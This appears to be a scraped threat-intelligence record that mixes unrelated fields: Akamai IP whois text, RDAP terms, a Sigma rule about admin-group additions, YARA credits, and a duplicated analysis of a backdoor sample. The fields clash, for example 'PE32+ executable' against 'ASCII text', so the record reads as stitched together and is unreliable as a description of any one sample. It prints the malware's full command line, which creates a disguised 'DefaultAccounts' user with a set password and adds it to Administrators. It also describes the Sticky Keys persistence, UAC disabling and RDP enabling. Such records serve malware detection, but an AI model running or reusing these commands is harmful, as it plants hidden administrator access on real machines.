description: Akamai Servers in Telecom Italia International Backbone
Akamai serves the images and streaming content for many of the
most popular Internet web-sites. When you connect to a web-site
your browser first contacts the content provider and downloads
an html file. This file contains embedded URLs that tell your
browser where to find all the objects necessary to finish
displaying the page. In the case of an "Akamaized" site, these
URLs point to the Akamai Network. Next, your browser makes
connections to the URLs to obtain the images or streaming
content. Again, for an "Akamaized" site, your browser will
contact an Akamai server to obtain the requested items.
Generally a TCP server listens on a well-known port < 1023 (for
example port 80 for HTTP), and a TCP client connects from a
port > 1023 assigned by the operating system. So a connection
from port 80 of the Akamai server to a high numbered port on
your machine, is a normal HTTP transaction.
If you'd like to learn more visit the FAQ at
http://www.akamai.com/en/html/misc/support_faq.html
>>> IP range assigned under AW <<<

issuer.CN: DigiCert TLS Hybrid ECC SHA384 2020 CA1

notices.title: Terms of Use
description: By submitting an RDAP query, you agree that you will use this data only for
lawful purposes and that, under no circumstances will you use this data to:
(1) allow, enable, or otherwise support the transmission by email, telephone,
or facsimile of mass, unsolicited, commercial advertising, or spam; or
(2) enable high volume, automated, or electronic processes that send queries,
data, or email to Markmonitor (or its systems) or the domain name contacts (or
its systems).
Markmonitor reserves the right to modify these terms at any time.
By submitting this query, you agree to abide by this policy.

sigma_analysis_results.rule_description: This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity

values.CommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user DefaultAccounts Security1215! /add&net user DefaultAccounts /FULLNAME:"IIS Host Account" /COMMENT:"A user account managed by the IIS subsystem." /EXPIRES:NEVER /Active:YES&net localgroup users DefaultAccounts /delete&net localgroup Administrators DefaultAccounts /add&net localgroup "Network Configuration Operators" DefaultAccounts /add&net localgroup "Power Users" DefaultAccounts /add&exit
values.ParentCommandLine: "C:\Users\george\Desktop\executable.exe"

attributes.magic: PE32+ executable (GUI) x86-64, for MS Windows

crowdsourced_ai_results.analysis: The sample is a malicious backdoor that performs several system modifications to establish persistence and grant remote access. It creates a new user account with the password 'Security1215!', adds it to the Administrators group, and then hides the account from the logon screen via the 'Winlogon\SpecialAccounts\UserList' registry key. For persistence, it replaces 'Utilman.exe' with itself, a technique known as a Sticky Keys backdoor. It also weakens system security by disabling UAC (setting registry value 'EnableLUA' to 0) and enabling RDP (setting 'fDenyTSConnections' to 0).

trid.file_type: file seems to be plain text/ASCII

attributes.magic: ASCII text, with CRLF line terminators

crowdsourced_yara_results.description: Detects PE Type babyShark loader mentioned in February 2019 blog post by PaloAltNetworks
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)
Felix Bilstein - yara-signator at cocacoding dot com
Felix Bilstein - yara-signator at cocacoding dot com

crowdsourced_ai_results.analysis: The sample is a malicious backdoor that performs several system modifications to establish persistence and grant remote access. It creates a new user account with the password 'Security1215!', adds it to the Administrators group, and then hides the account from the logon screen via the 'Winlogon\SpecialAccounts\UserList' registry key. For persistence, it replaces 'Utilman.exe' with itself, a technique known as a Sticky Keys backdoor. It also weakens system security by disabling UAC (setting registry value 'EnableLUA' to 0) and enabling RDP (setting 'fDenyTSConnections' to 0).
